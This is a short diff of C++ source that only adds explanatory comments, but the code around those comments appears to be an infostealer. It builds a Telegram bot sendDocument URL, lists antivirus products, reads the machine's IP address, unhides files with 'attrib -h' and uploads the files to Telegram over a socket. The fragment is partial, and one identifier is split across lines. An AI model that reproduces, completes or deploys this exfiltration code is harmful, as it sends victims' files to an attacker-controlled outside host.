@@ -17,8 +17,8 @@ void start(string name) {
 } 
 
 int main() { 
-    string TOKEN = "YOUR_TOKEN_HERE"; 
-    string CHAT_ID = "YOUR_CHAT_ID_HERE";
+    string TOKEN = "YOUR_TOKEN_HERE"; // Replace with your Telegram Bot API token
+    string CHAT_ID = "YOUR_CHAT_ID_HERE"; // Replace with your Telegram chat ID
     string url = "https://api.telegram.org/bot" + TOKEN + "/sendDocument?chat_id=" + CHAT_ID; 
 
     vector<string> Antivirus = { "Windows Defender", "Avast", "AVG", "Avira", 
@@ -82,6 +82,7 @@ int main() {
     }
     InternetCloseHandle(hSession);
 
+    // Remove whitespace from IP address
     ip.erase(remove(ip.begin(), ip.end(), '\n'), ip.end());
     ip.erase(remove(ip.begin(), ip.end(), '\r'), ip.end());
 
@@ -95,9 +96,10 @@ int main() {
         string command = "attrib -h \"" + path + "\""; 
         system(command.c_str()); 
 
+        // Upload file to Telegram using socket
         SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
         if (so
-    ck == INVALID_SOCKET) {
+ck == INVALID_SOCKET) {
             continue;
         }
 
